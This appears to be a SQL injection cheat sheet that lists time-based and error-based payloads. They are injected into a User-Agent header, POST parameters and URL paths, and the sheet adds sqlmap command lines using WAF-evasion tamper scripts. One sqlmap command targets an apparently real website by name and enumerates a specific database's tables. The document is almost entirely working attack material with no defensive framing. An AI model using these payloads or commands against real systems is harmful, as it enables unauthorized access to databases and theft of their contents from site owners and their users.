# Request

```yaml
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
```

```yaml
res_id=1111&method=add_menu_item_tags&item_id=1111-if(mid(version/*f*/(),1,1)=4,sleep/*f*/(5),0)&new_tags%5B%5D=3&menu_id=1111
```

```
atp-agent%27and%2F%2A%2A%2Fextractvalue%281%2Cconcat%28char%28126%29%2C%28select+user%28%29%29%29%29and%27
```
```
saleslead/6b6a8a5a-4a74-46db-b2fe-32a46f927ecc" AND (length(database())) = "11 --+-
```





Sqli Payloads
```sql
'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
"XOR(if(now()=sysdate(),sleep(12),0))XOR”Z
"XOR(if(now()=sysdate(),sleep(1200),0))XOR”Z
"XOR(if(now()=sysdate(),sleep(0),0))XOR”Z
"XOR(if(now()=sysdate(),sleep(6),0))XOR”Z
"XOR(if(now()=sysdate(),sleep(3),0))XOR”Z
"XOR(if(now()=sysdate(),sleep(0),0))XOR”Z
"XOR(if(now()=sysdate(),sleep(12),0))XOR”Z
"XOR(if(now()=sysdate(),sleep(6),0))XOR”Z
"XOR(if(now()=sysdate(),sleep(0),0))XOR”Z
%20AND%20SLEEP(15)%23
%20AND%20SLEEP(1005)%23
```

Usage 
```command
sqlmap -u "https://www.vapingjoint.com/product.php?cat=6" --random-agent --keep-alive --threads=10 --level=5 --risk=3 --dbs --flush-session --tamper=space2comment,modsecurityzeroversioned --batch -D breezeyworld_vap --tables
```
```command
sqlmap -p log -r request-cz.txt --current-user --level=2 --risk=2
```

```
sqlmap.py -r request --batch --random-agent --tamper=space2comment --level=5 --risk=3 --drop-set-cookie --threads 10 --dbs
```

```
'or(extractvalue(rand(),concat(0x3a,(select+user()))))=1--%20aa
```
